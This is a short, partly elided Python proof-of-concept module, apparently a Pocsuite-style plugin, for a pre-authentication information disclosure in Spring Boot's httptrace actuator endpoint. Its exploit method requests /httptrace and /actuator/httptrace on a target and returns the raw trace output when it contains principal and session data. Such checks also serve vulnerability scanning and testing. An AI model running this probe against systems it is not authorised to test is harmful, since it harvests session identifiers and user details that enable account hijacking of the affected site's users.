...
class DemoPOC(POCBase):
    ...
    references = []
    name = 'springboot springboot Pre-Auth httptrace Information Disclosure'
    appPowerLink = ''
    appName = 'springboot'
    appVersion = ''
    ...
    def _exploit(self):
        result = {}
        paths=["/httptrace","/actuator/httptrace"]
        for  path in paths:
            res = requests.get(urljoin(self.url,path), headers=self.headers)
            logger.debug(res.text)
            if "traces" in res.text and "principal" in res.text and "session" in res.text:
                return res.text
